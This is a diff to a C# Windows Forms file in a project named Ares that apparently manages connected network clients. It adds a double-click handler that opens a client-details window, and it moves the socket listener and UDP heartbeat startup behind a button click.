@@ -26,26 +26,54 @@ namespace Ares
         public Form1()
         {
             InitializeComponent();
+            listBox1.MouseDoubleClick += new MouseEventHandler(listBox1_DoubleClick);
         }
 
-        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
-        {
-        }
+
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            Environment.Exit(Environment.ExitCode);
+            Environment.Exit(1);
         }
-
+        private void listBox1_DoubleClick(object sender, MouseEventArgs e)
+        {
+            int index = this.listBox1.IndexFromPoint(e.Location);
+            if (index != System.Windows.Forms.ListBox.NoMatches)
+            {
+                Form2 form = new Form2();
+                try
+                {
+                    form.Close();
+                }
+                catch { }
+                try
+                {
+                    form = new Form2();
+                    Form2.ClientIP = IPAddress.Parse(listBox1.GetItemText(listBox1.SelectedItem));
+                    Form2.ClientPort = PortNumber;
+                    form.Show();
+                }
+                catch
+                {
+                    MessageBox.Show("Unable To Open Client Details \nTry Restarting");
+                }
+            }
+        }
         private void Form1_Load(object sender, EventArgs e)
         {
             Console.SetOut(new ControlWriter(logBox));
             Console.WriteLine("[i] Welcome To Ares");
+            textBox1.Text = ipAd.ToString();
+            PortBox.Text = PortNumber.ToString();
+        }
+        private void button1_Click(object sender, EventArgs e)
+        {
+            button1.Enabled = false;
+            PortNumber = Int32.Parse(PortBox.Text);
+            ipAd = IPAddress.Parse(textBox1.Text);
             Task.Factory.StartNew(() => AsynchronousSocketListener.StartListening());
             Task.Factory.StartNew(() => start());
             Task.Factory.StartNew(() => reset());
             Task.Factory.StartNew(() => UDPHeartBeat.start());
-            textBox1.Text = ipAd.ToString();
-            PortBox.Text = PortNumber.ToString();
         }
         public static void reset()
         {
@@ -88,6 +116,7 @@ namespace Ares
                 {
                     Console.WriteLine(e);
                 }
+
                 Thread.Sleep(1000);
             }
         }
@@ -125,6 +154,8 @@ namespace Ares
             logBox.SelectionStart = logBox.TextLength;
             logBox.ScrollToCaret();
         }
+
+
     }
     public static class threadsafe
     {
